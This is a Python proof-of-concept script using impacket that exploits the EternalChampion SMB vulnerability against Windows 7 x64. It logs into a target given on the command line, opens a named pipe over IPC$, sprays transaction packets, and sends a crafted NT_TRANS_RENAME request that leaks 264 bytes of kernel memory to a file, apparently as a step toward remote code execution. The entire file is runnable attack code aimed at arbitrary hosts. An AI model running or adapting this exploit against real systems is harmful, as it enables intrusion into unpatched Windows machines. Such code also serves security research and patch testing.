#!/usr/bin/python
from impacket import smb
from mysmb import MYSMB
from struct import pack
import sys

'''
PoC: demonstrates how NSA eternalchampion leaks a transaction struct

The purpose of leak is getting CONNECTION address.

Note:
- this PoC only test against Windows 7 x64
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 3:
	print("{} <ip> <pipe_name>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = sys.argv[2]

conn = MYSMB(target)

conn.login(USERNAME, PASSWORD, maxBufferSize=512)

tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)
fid = conn.nt_create_andx(tid, pipe_name)  # any valid share name should be OK

for i in range(10):
	conn.send_trans('', totalDataCount=0xdb0, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)

mid_ntrename = conn.next_mid()
# create NT_TRANS_RENAME (5) request
req1 = conn.create_nt_trans_packet(5, mid=mid_ntrename, param=pack('<HH', fid, 0), data='A'*0x1b8, maxParameterCount=0x4e48)
# leak 264 bytes
req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='A'*264)
reqs = [ conn.create_trans_packet('', totalDataCount=0xdb0, maxSetupCount=0, maxParameterCount=0, maxDataCount=0) for i in range(15) ]

conn.send_raw(req1[:-8])
conn.send_raw(req1[-8:]+req2+''.join(reqs))

data = conn.recv_transaction_data(mid_ntrename, 0x1b8+264)

# no write parameter
open('leak.dat', 'wb').write(data[4:])
print('All return data is written to leak.dat')


conn.close(tid, fid)
conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
